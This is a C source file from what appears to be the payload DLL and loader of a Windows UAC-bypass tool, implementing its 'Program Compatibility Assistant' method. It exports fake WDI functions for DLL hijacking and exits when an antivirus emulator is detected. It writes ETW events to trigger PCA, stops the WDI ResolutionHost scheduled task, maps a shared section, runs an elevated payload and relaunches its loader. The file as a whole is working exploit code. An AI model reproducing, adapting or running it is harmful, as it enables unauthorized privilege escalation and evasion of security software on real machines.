/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2021
*
*  TITLE:       PCA.C
*
*  VERSION:     3.56
*
*  DATE:        30 July 2021
* 
*  Fubuki Program Compatibility Assistant method support code.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "fubuki.h"
#include <evntprov.h>
#include <taskschd.h>
#include <intrin.h>

#pragma comment(lib, "taskschd.lib")

const ULONGLONG ZERO_VALUE = 0;

/*
* WdiGetDiagnosticModuleInterfaceVersion
*
* Purpose:
*
* Stub for fake WDI exports.
*
*/
ULONG_PTR WINAPI WdiGetDiagnosticModuleInterfaceVersion(
    VOID
)
{
    return 1;
}

/*
* WdiStubGeneric
*
* Purpose:
*
* Stub for fake WDI exports.
*
*/
HRESULT WINAPI WdiStubGeneric(
    ULONG_PTR UnusedParam1,
    ULONG_PTR UnusedParam2
)
{
    UNREFERENCED_PARAMETER(UnusedParam1);
    UNREFERENCED_PARAMETER(UnusedParam2);

    return S_OK;
}

/*
* ucmxStopTaskByName
*
* Purpose:
*
* Stop scheduled task by name.
*
*/
BOOL ucmxStopTaskByName(
    _In_ LPCWSTR TaskFolder,
    _In_ LPCWSTR TaskName
)
{
    BOOL bResult = FALSE;
    HRESULT hr;
    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    IRegisteredTask* pTask = NULL;
    TASK_STATE taskState;

    BSTR bstrTaskFolder = NULL;
    BSTR bstrTask = NULL;
    VARIANT varDummy;

    do {

        bstrTaskFolder = SysAllocString(TaskFolder);
        if (bstrTaskFolder == NULL)
            break;

        bstrTask = SysAllocString(TaskName);
        if (bstrTask == NULL)
            break;

        hr = CoCreateInstance(&CLSID_TaskScheduler,
            NULL,
            CLSCTX_INPROC_SERVER,
            &IID_ITaskService,
            (void**)&pService);

        if (FAILED(hr))
            break;

        VariantInit(&varDummy);

        hr = pService->lpVtbl->Connect(pService,
            varDummy,
            varDummy,
            varDummy,
            varDummy);

        if (FAILED(hr))
            break;

        hr = pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pRootFolder);
        if (FAILED(hr))
            break;

        hr = pRootFolder->lpVtbl->GetTask(pRootFolder, bstrTask, &pTask);
        if (FAILED(hr))
            break;

        hr = pTask->lpVtbl->get_State(pTask, &taskState);
        if (FAILED(hr))
            break;

        if (taskState == TASK_STATE_RUNNING) {
            hr = pTask->lpVtbl->Stop(pTask, 0);
        }

        bResult = SUCCEEDED(hr);

    } while (FALSE);

    if (bstrTaskFolder)
        SysFreeString(bstrTaskFolder);

    if (bstrTask)
        SysFreeString(bstrTask);

    if (pTask)
        pTask->lpVtbl->Release(pTask);

    if (pRootFolder)
        pRootFolder->lpVtbl->Release(pRootFolder);

    if (pService)
        pService->lpVtbl->Release(pService);

    return bResult;
}

/*
* pcaEtwCall
*
* Purpose:
*
* Call etw write event.
*
*/
ULONG pcaEtwCall()
{
    CONST GUID providerGuid = { 0x0EEF54E71, 0x661, 0x422D, {0x9A, 0x98, 0x82, 0xFD, 0x49, 0x40, 0xB8, 0x20} };
    CONST EVENT_DATA_DESCRIPTOR eventUserData[3] = {
        {(UINT_PTR)&ZERO_VALUE, sizeof(ULONG)},
        {(UINT_PTR)&ZERO_VALUE, sizeof(ULONG)},
        {(UINT_PTR)NULL, 0}
    };

    EVENT_DESCRIPTOR eventDescriptor;
    ULONG status = 0;

    eventDescriptor.Id = 0x1F46;
    eventDescriptor.Version = 0;
    eventDescriptor.Channel = 0x11;
    eventDescriptor.Level = 4;
    eventDescriptor.Opcode = 0;
    eventDescriptor.Task = 0;
    eventDescriptor.Keyword = 0x4000000000000100;

    status = EtwEventWriteNoRegistration(
        &providerGuid,
        &eventDescriptor,
        3,
        (PEVENT_DATA_DESCRIPTOR)&eventUserData);

    if (status == ERROR_SUCCESS) {

        eventDescriptor.Id = 0x1F48;

        status = EtwEventWriteNoRegistration(
            &providerGuid,
            &eventDescriptor,
            3,
            (PEVENT_DATA_DESCRIPTOR)&eventUserData);

    }

    return status;
}

/*
* pcaStopWDI
*
* Purpose:
*
* Stop WDI task and exit loader.
*
*/
ULONG pcaStopWDI()
{
    HRESULT hr;
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

    ucmDbgMsg(L"[PCALDR] pcaStopWDI\r\n");

    hr = CoInitializeEx(NULL,
        COINIT_APARTMENTTHREADED |
        COINIT_DISABLE_OLE1DDE |
        COINIT_SPEED_OVER_MEMORY);

    if (SUCCEEDED(hr)) {

        ucmSleep(1000);

        if (ucmxStopTaskByName(
            TEXT("Microsoft\\Windows\\WDI"),
            TEXT("ResolutionHost")))
        {
            ucmDbgMsg(L"[PCALDR] ucmxStopTaskByName success\r\n");
            ntStatus = STATUS_SUCCESS;
        }

        CoUninitialize();

    }

    return ntStatus;
}

/*
* pcaWin7Trigger
*
* Purpose:
*
* PCA Windows 7 stub handler.
*
*/
ULONG pcaWin7Trigger(
    VOID
)
{
    ucmSleep(2000);
    return 0;
}

/*
* pcaEntryPointLoader
*
* Purpose:
*
* Entry point to be used in exe mode with PCA method ONLY.
*
*/
VOID WINAPI pcaEntryPointLoader(
    VOID)
{
    ULONG rLen = 0, status = 0;
    LPCWSTR lpCmdline = GetCommandLine();
    WCHAR szLoaderParam[MAX_PATH + 1];

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    RtlSecureZeroMemory(szLoaderParam, sizeof(szLoaderParam));
    GetCommandLineParam(lpCmdline, 0, (LPWSTR)&szLoaderParam, MAX_PATH, &rLen);

    if (rLen) {

        if (szLoaderParam[0] == TEXT('1')) {
            status = pcaEtwCall();
        }
        else if (szLoaderParam[0] == TEXT('2')) {
            status = pcaStopWDI();
        } else if(szLoaderParam[0] == TEXT('3')) {
            status = pcaWin7Trigger();
        }
    }
    else {
        ucmDbgMsg(L"[PCALDR] Empty command line\r\n");
    }

    RtlExitUserProcess(status);
}

/*
* pcaEntryPointDll
*
* Purpose:
*
* Entry point to be used in dll mode with PCA method ONLY.
*
*/
BOOL WINAPI pcaEntryPointDll(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    BOOL bSharedParamsReadOk;
    PWSTR lpParameter;
    ULONG cbParameter;

    HANDLE hSharedSection = NULL;
    PCA_LOADER_BLOCK* pvLoaderBlock = NULL;

    NTSTATUS ntStatus;

    SIZE_T viewSize = PAGE_SIZE;

    HANDLE hSharedEvent = NULL;
    WCHAR szObjectName[MAX_PATH];
    WCHAR szName[128];
    WCHAR szLoaderCmdLine[2];
    WCHAR szLoader[MAX_PATH + 1];

    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES obja;

    PROCESS_INFORMATION processInfo;
    STARTUPINFO startupInfo;

    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('f0ff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {

        LdrDisableThreadCalloutsForDll(hinstDLL);

        ucmDbgMsg(L"[PCADLL] Entry\r\n");

        RtlSecureZeroMemory(&szName, sizeof(szName));
        ucmGenerateSharedObjectName(FUBUKI_PCA_SECTION_ID, szName);

        _strcpy(szObjectName, TEXT("\\Sessions\\"));
        ultostr(NtCurrentPeb()->SessionId, _strend(szObjectName));
        _strcat(szObjectName, TEXT("\\BaseNamedObjects\\"));
        _strcat(szObjectName, szName);

        RtlInitUnicodeString(&usName, szObjectName);
        InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        if (NT_SUCCESS(NtOpenSection(&hSharedSection,
            SECTION_ALL_ACCESS,
            &obja)))
        {
            ntStatus = NtMapViewOfSection(
                hSharedSection,
                NtCurrentProcess(),
                &pvLoaderBlock,
                0,
                PAGE_SIZE,
                NULL,
                &viewSize,
                ViewUnmap,
                MEM_TOP_DOWN,
                PAGE_READWRITE);

            if (NT_SUCCESS(ntStatus) && pvLoaderBlock) {

                RtlSecureZeroMemory(&szLoader, sizeof(szLoader));
                _strncpy(szLoader, MAX_PATH, pvLoaderBlock->szLoader, MAX_PATH);

                ucmDbgMsg(L"[PCADLL] NtMapViewOfSection success\r\n");

                RtlSecureZeroMemory(&szName, sizeof(szName));
                _strcpy(szObjectName, L"\\BaseNamedObjects\\");
                ucmGenerateSharedObjectName(FUBUKI_PCA_EVENT_ID, szName);
                _strcat(szObjectName, szName);

                RtlInitUnicodeString(&usName, szObjectName);
                InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

                if (NT_SUCCESS(NtOpenEvent(&hSharedEvent, EVENT_MODIFY_STATE, &obja))) {

                    //
                    // Read shared params block.
                    //
                    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
                    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
                    if (bSharedParamsReadOk) {
                        ucmDbgMsg(L"[PCADLL] Shared parameters read OK\r\n");
                        lpParameter = g_SharedParams.szParameter;
                        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
                    }
                    else {
                        ucmDbgMsg(L"[PCADLL] Shared parameters defaulted\r\n");
                        lpParameter = NULL;
                        cbParameter = 0UL;
                    }

                    //
                    // Reset windir environment variable.
                    //
                    ucmSetEnvironmentVariable(T_WINDIR, USER_SHARED_DATA->NtSystemRoot);

                    //
                    // Run payload.
                    //
                    if (ucmLaunchPayload(lpParameter, cbParameter)) {
                        ucmDbgMsg(L"[PCADLL] Payload executed OK\r\n");
                        pvLoaderBlock->OpResult = FUBUKI_PCA_PAYLOAD_RUN;
                    }
                    else {
                        ucmDbgMsg(L"[PCADLL] Error during payload execution\r\n");
                    }

                    //
                    // Restart loader with "2" param.
                    //
                    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));

                    startupInfo.cb = sizeof(startupInfo);

                    //
                    // Set loader command line.
                    //
                    szLoaderCmdLine[0] = TEXT('2');
                    szLoaderCmdLine[1] = 0;

                    if (CreateProcess(
                        szLoader,
                        szLoaderCmdLine,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_NO_WINDOW,
                        NULL,
                        NULL,
                        &startupInfo,
                        &processInfo))
                    {
                        ucmDbgMsg(L"[PCADLL] Loader run OK\r\n");

                        CloseHandle(processInfo.hThread);
                        CloseHandle(processInfo.hProcess);
                        pvLoaderBlock->OpResult |= FUBUKI_PCA_LOADER_RUN;
                    }
                    else {
                        ucmDbgMsg(L"[PCADLL] Error during loader execution\r\n");
                    }

                    NtSetEvent(hSharedEvent, NULL);
                    NtClose(hSharedEvent);
                    ucmDbgMsg(L"[PCADLL] Shared event signaled\r\n");

                    //
                    // Notify Akagi.
                    //
                    if (bSharedParamsReadOk) {
                        ucmSetCompletion(g_SharedParams.szSignalObject);
                    }

                }
                else {
                    ucmDbgMsg(L"[PCADLL] NtOpenEvent failed\r\n");
                }

                NtUnmapViewOfSection(NtCurrentProcess(), pvLoaderBlock);

            }
            else {
                ucmDbgMsg(L"[PCADLL] MapViewOfFile failed\r\n");
            }

            NtClose(hSharedSection);

        }
        else {
            ucmDbgMsg(L"[PCADLL] OpenFileMapping failed\r\n");
        }

    }

    return TRUE;
}
